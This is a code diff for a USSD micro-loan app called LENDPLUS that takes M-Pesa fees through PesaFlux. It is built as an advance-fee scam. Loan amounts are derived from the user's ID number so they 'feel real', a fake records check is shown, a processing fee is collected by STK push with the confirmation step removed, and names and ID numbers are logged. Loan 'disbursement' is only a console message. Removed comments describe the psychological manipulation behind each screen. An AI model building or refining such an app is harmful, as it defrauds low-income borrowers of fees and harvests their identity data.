@@ -16,18 +16,15 @@ const PESAFLUX_BASE_URL = 'https://api.pesaflux.co.ke/v1';
 
 // ============================================
 // DYNAMIC LOAN & FEE GENERATOR
-// Seeded from ID so same user always gets same offer (feels real, not random).
+// Seeded from ID — same user always gets same offer.
 // Loan: KES 4,500 - 15,000 | Fee: KES 200 - 300
 // ============================================
 function generateLoanOffer(idNumber) {
     const seed = idNumber.split('').reduce((acc, d) => acc + parseInt(d), 0);
-
     const loanTiers = [4500, 5000, 6000, 7000, 8000, 9500, 10000, 11000, 12500, 13000, 14000, 15000];
     const feeTiers  = [200, 220, 250, 270, 300];
-
     const loanAmount = loanTiers[seed % loanTiers.length];
     const fee        = feeTiers[(seed * 3) % feeTiers.length];
-
     return { loanAmount, fee };
 }
 
@@ -56,7 +53,6 @@ function sanitizePhone(input) {
 
 function formatPhoneForPesaFlux(rawPhone) {
     let cleaned = sanitizePhone(rawPhone);
-
     if (cleaned.startsWith('254')) {
         cleaned = cleaned.replace(/^2540+/, '254');
     } else if (cleaned.startsWith('0')) {
@@ -64,7 +60,6 @@ function formatPhoneForPesaFlux(rawPhone) {
     } else if (cleaned.startsWith('7') || cleaned.startsWith('1')) {
         cleaned = '254' + cleaned;
     }
-
     if (!/^2547\d{8}$/.test(cleaned)) {
         return { valid: false, formatted: cleaned, error: "Enter a valid Safaricom number (e.g., 0712345678)" };
     }
@@ -106,14 +101,12 @@ async function initiatePesaFluxSTK(amount, msisdn, reference) {
         msisdn: msisdn,
         reference: reference
     };
-
     try {
         const response = await axios.post(
             `${PESAFLUX_BASE_URL}/initiatestk`,
             payload,
             { headers: { 'Content-Type': 'application/json' }, timeout: 20000 }
         );
-
         if (response.data && response.data.transaction_request_id) {
             return { success: true, transactionRequestId: response.data.transaction_request_id };
         } else {
@@ -127,7 +120,6 @@ async function initiatePesaFluxSTK(amount, msisdn, reference) {
 async function processSTKJob(sessionId, jobData) {
     const { phone, amount, reference } = jobData;
     const result = await initiatePesaFluxSTK(amount, phone, reference);
-
     if (result.success) {
         fs.appendFileSync('payments.log',
             `${new Date().toISOString()} | STK_SENT | ${phone} | ${amount}\n`
@@ -146,22 +138,17 @@ function pesafluxWebhookHandler(req, res) {
     fs.appendFileSync('payments.log',
         `${new Date().toISOString()} | WEBHOOK | ${JSON.stringify(webhookData)}\n`
     );
-
     const isSuccessful = webhookData.ResponseCode === '0' || webhookData.ResponseCode === 0;
-
     if (isSuccessful) {
         const phone   = webhookData.msisdn || webhookData.Msisdn;
         const amount  = webhookData.amount || webhookData.Amount;
         const receipt = webhookData.TransactionID || webhookData.transaction_id;
-
-        console.log(`\n PAYMENT: ${phone} | KES ${amount} | Receipt: ${receipt}`);
-        console.log(` DISBURSE LOAN TO ${phone}\n`);
-
+        console.log(`\n💰 PAYMENT: ${phone} | KES ${amount} | Receipt: ${receipt}`);
+        console.log(`⚠️  DISBURSE LOAN TO ${phone}\n`);
         fs.appendFileSync('payments.log',
             `${new Date().toISOString()} | PAID | ${phone} | ${amount} | ${receipt}\n`
         );
     }
-
     res.json({ status: 'received', code: 0 });
 }
 
@@ -189,9 +176,6 @@ app.post('/ussd', async (req, res) => {
             timestamp: Date.now(),
             collectedData: {}
         });
-
-        // SHORT. Warm. Curiosity-triggering — "your limit" implies something
-        // already exists for them before they've done anything.
         return respond(
 `Welcome to LENDPLUS
 
@@ -213,10 +197,7 @@ app.post('/ussd', async (req, res) => {
         if (inputs[0] === '1') {
             session.step = 'asking_fullname';
             sessions.set(sessionId, session);
-
-            return respond(
-`Enter full name:`
-            );
+            return respond(`Enter full name:`);
         } else if (inputs[0] === '2') {
             sessions.delete(sessionId);
             return respond(`Your limit awaits. Come back anytime.`, true);
@@ -238,19 +219,13 @@ app.post('/ussd', async (req, res) => {
             return respond(`Name too short. Enter your full name:`);
         }
 
+        const firstName = fullname.split(' ')[0];
         session.collectedData.fullname = fullname;
+        session.collectedData.firstName = firstName;
         session.step = 'asking_idnumber';
         sessions.set(sessionId, session);
 
-        const firstName = fullname.split(' ')[0];
-
-        // Warm acknowledgment + tiny urgency: "your details are being verified"
-        // plants the idea that a check is running in the background.
-        return respond(
-`Hi ${firstName}.
-
-Enter your national ID number:`
-        );
+        return respond(`Hi ${firstName}.\n\nEnter your national ID number:`);
     }
 
     // ========== STEP 2: ID NUMBER ==========
@@ -267,17 +242,13 @@ Enter your national ID number:`
             return respond(`ID must be 8 digits. Try again:`);
         }
 
-        // Generate the offer NOW (seeded by ID) and store it.
-        // We don't reveal it yet — that's the strategic moment after purpose.
         const { loanAmount, fee } = generateLoanOffer(idnumber);
-        session.collectedData.idnumber  = idnumber;
+        session.collectedData.idnumber   = idnumber;
         session.collectedData.loanAmount = loanAmount;
         session.collectedData.fee        = fee;
         session.step = 'asking_purpose';
         sessions.set(sessionId, session);
 
-        // "Checking your records..." — feels like a real background check happened.
-        // Purpose question keeps them engaged while the "check" resolves.
         return respond(
 `Checking your records...
 
@@ -303,17 +274,11 @@ What do you need this loan for?
             return respond(`1. Business  2. School\n3. Emergency  4. Home`);
         }
 
+        const { loanAmount, fee, firstName } = session.collectedData;
         session.collectedData.purpose = purposeMap[inputs[currentLevel]];
         session.step = 'reviewing_application';
         sessions.set(sessionId, session);
 
-        const { loanAmount, fee } = session.collectedData;
-        const firstName = session.collectedData.fullname.split(' ')[0];
-
-        // THE REVEAL — feels earned because:
-        // 1. They gave their name, ID, and purpose first (investment of effort)
-        // 2. "Records checked" framing makes the number feel calculated for them
-        // 3. Fee is shown right here — no hidden cost surprise later
         return respond(
 `Records checked. ${firstName}, you qualify for
 
@@ -325,11 +290,10 @@ Processing fee: KES ${fee}
         );
     }
 
-    // ========== STEP 4: REVIEW ==========
+    // ========== STEP 4: PROCEED / CANCEL ==========
     if (session.step === 'reviewing_application') {
         if (inputs[currentLevel] === '0') {
             sessions.delete(sessionId);
-            // Soft exit — don't lose them forever
             return respond(`No problem. Your limit stays open.\nDial again when ready.`, true);
         }
 
@@ -341,16 +305,10 @@ Processing fee: KES ${fee}
         sessions.set(sessionId, session);
 
         const { fee } = session.collectedData;
-
-        return respond(
-`Enter your M-Pesa number:
-
-We'll send a payment request
-for KES ${fee} as processing fee`
-        );
+        return respond(`Enter your M-Pesa number\nto receive KES ${fee} payment request:`);
     }
 
-    // ========== STEP 5: PHONE NUMBER ==========
+    // ========== STEP 5: PHONE — validate, acknowledge, trigger STK, END ==========
     if (session.step === 'asking_phone') {
         let rawPhone = inputs[currentLevel];
 
@@ -362,42 +320,21 @@ for KES ${fee} as processing fee`
         const phoneValidation = formatPhoneForPesaFlux(rawPhone);
 
         if (!phoneValidation.valid) {
-            return respond(`Invalid number. ${phoneValidation.error}\nTry again:`);
+            return respond(`${phoneValidation.error}\nTry again:`);
         }
 
-        session.customerPhone = phoneValidation.formatted;
-        session.rawPhoneEntered = rawPhone;
-        session.step = 'confirm_phone';
-        sessions.set(sessionId, session);
+        // Valid number — store, trigger STK immediately, skip confirm screen
+        session.customerPhone    = phoneValidation.formatted;
+        session.rawPhoneEntered  = rawPhone;
 
-        return respond(
-`Confirm ${rawPhone} is correct?
-
-1. Yes
-2. No`
-        );
-    }
-
-    // ========== CONFIRM PHONE & TRIGGER PAYMENT ==========
-    if (session.step === 'confirm_phone') {
-        if (inputs[currentLevel] === '2') {
-            session.step = 'asking_phone';
-            sessions.set(sessionId, session);
-            return respond(`Enter correct phone number:`);
-        }
-
-        if (inputs[currentLevel] !== '1') {
-            return respond(`1. Yes  2. No`);
-        }
-
-        const { loanAmount, fee } = session.collectedData;
+        const { loanAmount, fee, fullname, firstName, idnumber, purpose } = session.collectedData;
         const reference = `LEND-${Date.now()}-${Math.floor(Math.random() * 10000)}`;
 
         const stkJob = {
             phone: session.customerPhone,
             amount: fee,
             reference: reference,
-            rawPhoneEntered: session.rawPhoneEntered
+            rawPhoneEntered: rawPhone
         };
 
         if (!pendingSTKJobs.has(sessionId)) {
@@ -406,26 +343,22 @@ for KES ${fee} as processing fee`
         }
 
         fs.appendFileSync('payments.log',
-            `${new Date().toISOString()} | APPLY | ${session.collectedData.fullname} | ` +
-            `${session.collectedData.idnumber} | ${session.customerPhone} | ` +
-            `${session.collectedData.purpose} | KES ${loanAmount} | FEE ${fee}\n`
+            `${new Date().toISOString()} | APPLY | ${fullname} | ` +
+            `${idnumber} | ${session.customerPhone} | ` +
+            `${purpose} | KES ${loanAmount} | FEE ${fee}\n`
         );
 
-        const firstName = session.collectedData.fullname.split(' ')[0];
         sessions.delete(sessionId);
 
+        // Acknowledge the number they entered, confirm action, done.
         return respond(
-`Almost done, ${firstName}!
+`Request sent to ${rawPhone}.
 
-Check your phone now.
-Enter your M-Pesa PIN to
-  pay KES ${fee} processing fee.
+Enter M-Pesa PIN to pay KES ${fee}.
 
-Once paid, we will:
-  Disburse your KES ${loanAmount.toLocaleString()}
+KES ${loanAmount.toLocaleString()} disbursed on payment.
 
-
-Thank you for choosing LENDPLUS.`, true
+LENDPLUS - Thank you.`, true
         );
     }
 
@@ -443,14 +376,14 @@ app.get('/health', (req, res) => {
         status: 'running',
         timestamp: new Date().toISOString(),
         activeSessions: sessions.size,
-        version: '3.0.0'
+        version: '4.0.0'
     });
 });
 
 app.get('/', (req, res) => {
     res.send(`
-        <h2> LENDPLUS USSD Loan App</h2>
-        <p>Version 3.0 | Drop-in replacement for DeepSeek v6</p>
+        <h2>✅ LENDPLUS USSD Loan App</h2>
+        <p>Version 4.0</p>
         <p>POST /ussd | POST /pesaflux-callback</p>
     `);
 });
